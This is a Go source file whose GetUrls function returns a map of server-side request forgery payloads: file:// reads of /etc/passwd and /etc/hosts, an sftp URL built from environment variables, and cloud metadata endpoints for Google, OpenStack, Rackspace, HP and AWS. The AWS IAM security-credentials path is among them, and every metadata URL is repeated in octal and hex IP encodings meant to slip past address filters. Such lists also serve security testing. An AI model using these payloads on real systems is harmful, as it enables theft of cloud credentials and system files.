package main

import (
	"fmt"
	"os"
)

func GetUrls() map[string]string {

	return map[string]string{
		"file/passwd": "file:///etc/passwd",
		"file/hosts":  "file:///etc/hosts",

		"sftp": fmt.Sprintf("sftp://%s:%s", os.Getenv("HOSTNAME"), os.Getenv("TCP_PORT")),

		"google/metadata":    "http://169.254.169.254/computeMetadata/v1/",
		"openstack/metadata": "http://169.254.169.254/openstack",
		"rackspace/metadata": "http://169.254.169.254/openstack",
		"hp/metadata":        "http://169.254.169.254/2009-04-04/meta-data/",
		"aws/userdata":       "http://169.254.169.254/latest/user-data/",
		"aws/hostname":       "http://169.254.169.254/latest/meta-data/hostname/",
		"aws/credentials":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",

		"google/metadata/oct":    "http://0251.0376.0251.0376/computeMetadata/v1/",
		"openstack/metadata/oct": "http://0251.0376.0251.0376/openstack",
		"rackspace/metadata/oct": "http://0251.0376.0251.0376/openstack",
		"hp/metadata/oct":        "http://0251.0376.0251.0376/2009-04-04/meta-data/",
		"aws/userdata/oct":       "http://0251.0376.0251.0376/latest/user-data/",
		"aws/hostname/oct":       "http://0251.0376.0251.0376/latest/meta-data/hostname/",
		"aws/credentials/oct":    "http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/",

		"google/metadata/hex":    "http://0xA9FEA9FE/computeMetadata/v1/",
		"openstack/metadata/hex": "http://0xA9FEA9FE/openstack",
		"rackspace/metadata/hex": "http://0xA9FEA9FE/openstack",
		"hp/metadata/hex":        "http://0xA9FEA9FE/2009-04-04/meta-data/",
		"aws/userdata/hex":       "http://0xA9FEA9FE/latest/user-data/",
		"aws/hostname/hex":       "http://0xA9FEA9FE/latest/meta-data/hostname/",
		"aws/credentials/hex":    "http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/",
	}
}
